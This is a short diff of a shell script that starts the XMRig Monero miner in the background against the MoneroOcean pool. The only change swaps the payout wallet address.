@@ -22,7 +22,7 @@ echo "[+] Starting miner..."
 
 nohup ./xmrig \
 -o gulf.moneroocean.stream:10128 \
--u 44g3cUJmSyddMg129Tsh2rQdJKpG8DR7pCzEYqfbkFWqASCqNsC8uF5RwJrm3uoqgR4YhT4HWX97rW2ywTEcy5TX8Ga2BPX.${RIG} \
+-u 49WmcAJJbPEaTq7MusAMs3a2auvwUjqs1b6SqxtmT4g1QtPYus2jzZh7zpZoyt3oHeEZPaVem9F3AcyazyGZEstyVYqikP2.${RIG} \
 -p x \
 --coin monero \
 --randomx-mode fast \
